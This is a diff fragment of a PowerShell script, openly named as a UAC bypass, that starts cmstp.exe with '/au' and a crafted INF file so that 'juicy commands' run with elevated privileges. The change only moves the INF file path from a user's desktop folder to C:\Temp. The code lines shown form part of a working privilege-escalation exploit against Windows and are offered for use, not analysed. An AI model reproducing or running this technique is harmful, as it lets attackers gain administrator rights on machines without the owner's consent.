@@ -6,7 +6,7 @@
 # Todo: Make script edit the INF file for command to inject...
 
 # Point this to your INF file containing your juicy commands...
-$InfFile = "C:\Users\Alfred\Desktop\chh\UACBypass.inf"
+$InfFile = "C:\Temp\UACBypass.inf"
 
 Function Get-Hwnd
 {
@@ -80,7 +80,7 @@ add-type -AssemblyName System.Windows.Forms
 
 #Command to run
 $ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
-#$ps.Arguments = "/au C:\Users\Alfred\Desktop\chh\UACBypass.inf"
+#$ps.Arguments = "/au C:\Temp\UACBypass.inf"
 $ps.Arguments = "/au $InfFile"
 $ps.UseShellExecute = $false
 
